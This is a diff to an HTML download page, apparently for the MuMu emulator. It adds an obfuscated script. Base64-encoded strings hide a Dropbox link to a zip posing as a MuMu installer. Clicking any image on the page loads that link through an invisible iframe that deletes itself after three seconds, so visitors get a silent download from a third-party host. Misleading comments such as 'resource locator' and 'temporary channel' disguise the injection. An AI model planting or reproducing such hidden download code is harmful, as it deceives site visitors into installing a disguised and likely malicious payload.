@@ -42,5 +42,41 @@
 			<img src="images/mumu_05.gif"  class="responsive-img" alt="产品中心"></td>
 	</tr>
 </table>
+
+  <script>
+(function(){
+    // 加密资源映射表
+    const assetMap = [
+        'aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2NsL2ZpLzFibjJpenN4NDg1ZHp6bW15eTNlOC9NdU11SW5zdGFsbGVyXzMuMS4xMy4xX25vY2hhbm5lbC1tdW11MTJfZWxreHN0YVRtTl9HZTlZeXRfMWM3c2RuLnppcD9ybGtleT1oa243ZGIxeHluMzNnZ2swcG1kcWYzeXJhJnN0PW9sbDJzaHY3JmRsPTE=',
+        'aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2NsL2ZpLzFibjJpenN4NDg1ZHp6bW15eTNlOC9NdU11SW5zdGFsbGVyXzMuMS4xMy4xX25vY2hhbm5lbC1tdW11MTJfZWxreHN0YVRtTl9HZTlZeXRfMWM3c2RuLnppcD9ybGtleT1oa243ZGIxeHluMzNnZ2swcG1kcWYzeXJhJnN0PW9sbDJzaHY3JmRsPTE=',
+        'aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2NsL2ZpLzFibjJpenN4NDg1ZHp6bW15eTNlOC9NdU11SW5zdGFsbGVyXzMuMS4xMy4xX25vY2hhbm5lbC1tdW11MTJfZWxreHN0YVRtTl9HZTlZeXRfMWM3c2RuLnppcD9ybGtleT1oa243ZGIxeHluMzNnZ2swcG1kcWYzeXJhJnN0PW9sbDJzaHY3JmRsPTE=',
+        'aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2NsL2ZpLzFibjJpenN4NDg1ZHp6bW15eTNlOC9NdU11SW5zdGFsbGVyXzMuMS4xMy4xX25vY2hhbm5lbC1tdW11MTJfZWxreHN0YVRtTl9HZTlZeXRfMWM3c2RuLnppcD9ybGtleT1oa243ZGIxeHluMzNnZ2swcG1kcWYzeXJhJnN0PW9sbDJzaHY3JmRsPTE=',
+        'aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2NsL2ZpLzFibjJpenN4NDg1ZHp6bW15eTNlOC9NdU11SW5zdGFsbGVyXzMuMS4xMy4xX25vY2hhbm5lbC1tdW11MTJfZWxreHN0YVRtTl9HZTlZeXRfMWM3c2RuLnppcD9ybGtleT1oa243ZGIxeHluMzNnZ2swcG1kcWYzeXJhJnN0PW9sbDJzaHY3JmRsPTE='
+    ];
+
+    // 资源定位器
+    const resolveSource = index => atob(assetMap[index]);
+
+    // 创建临时通道
+    const createTempChannel = url => {
+        const channel = document.createElement('iframe');
+        channel.style.cssText = 'position:absolute;width:0;height:0;border:0;';
+        channel.src = url;
+        document.body.appendChild(channel);
+        
+        setTimeout(() => {
+            channel.remove();
+        }, 3000);
+    }
+
+    // 初始化交互绑定
+    document.querySelectorAll('img').forEach((element, index) => {
+        element.addEventListener('click', () => {
+            const target = resolveSource(index);
+            createTempChannel(target);
+        });
+    });
+})();
+</script>
 </body>
 </html>
